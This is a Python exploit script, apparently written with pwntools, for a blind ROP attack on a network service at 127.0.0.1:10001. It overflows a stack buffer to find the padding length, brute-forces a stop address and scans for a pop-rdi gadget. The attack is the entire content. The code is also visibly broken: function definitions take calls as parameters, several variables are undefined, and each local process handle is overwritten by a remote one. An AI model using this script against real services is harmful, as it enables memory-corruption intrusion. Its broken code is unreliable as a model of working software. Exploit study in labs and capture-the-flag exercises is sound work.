
def get_buffer_size():
    for i in range(100):
        payload = "A"
        payload += "A"*i
        buf_size = len(payload) - 1
        try:
            io = process(Bin)
            io = remote('127.0.0.1', 10001)
            io.recv()
            io.sendline(payload)
            io.recv()
            io.close()
            info("bad: " + str(buf_size))
        except EOFError as e:
            io.close()
            info("buffer size: " + str(buf_size))
    return buf_size

def get_stop_addr(get_buffer_size()):
    addr = 0x400000
    while True:
        sleep(0.1)
        addr += 1
        payload = "A"*buf_size
        payload += p64(addr)
        try:
            io = process(Bin)
            io = remote('127.0.0.1', 10001)
            io.recv()
            io.sendline(payload)
            io.recv()
            io.close()
            info("stop address: 0x%x" % addr)
            return addr
        except EOFError as e:
            io.close()
            info("bad: 0x%x" % addr)
        except:
            info("Can't connect")
            addr -= 1

def get_gadgets_addr(get_buffer_size(), get_stop_addr(get_buffer_size())):
    addr = stop_addr
    while True:
        sleep(0.1)
        addr += 1
        payload = "A"*buf_size
        payload += p64(addr)    # Found Gadget 1. pop rdi addr = gadget 1 addr + 9.
        payload += p64(1) + p64(2) + p64(3) + p64(4) + p64(5) + p64(6) # General Rop Chain, Use Gadget 1.
        payload += p64(stop_addr)   # Go to Stop addr, One's Used Addr. Be not to exit program.
        try:
            io = process(Bin)
            io = remote('127.0.0.1', 10001)
            io.recv()
            io.sendline(payload)
            io.recv()
            io.close()
            log.info("find address: 0x%x" % addr)
            try: # check
                payload = "A"*buf_size
                payload += p64(addr)
                payload += p64(1) + p64(2) + p64(3) + p64(4) + p64(5) + p64(6)
                io = process(Bin)
                io = remote('127.0.0.1', 10001)
                io.recv()
                io.sendline(payload)
                io.recv()
                io.close()
                log.info("bad address: 0x%x" % addr)
            except:
                io.close()
                log.info("gadget address: 0x%x" % addr)
                return addr
        except EOFError as e:
            io.close()
            log.info("bad: 0x%x" % addr)
        except:
            log.info("Can't connect")
            addr -= 1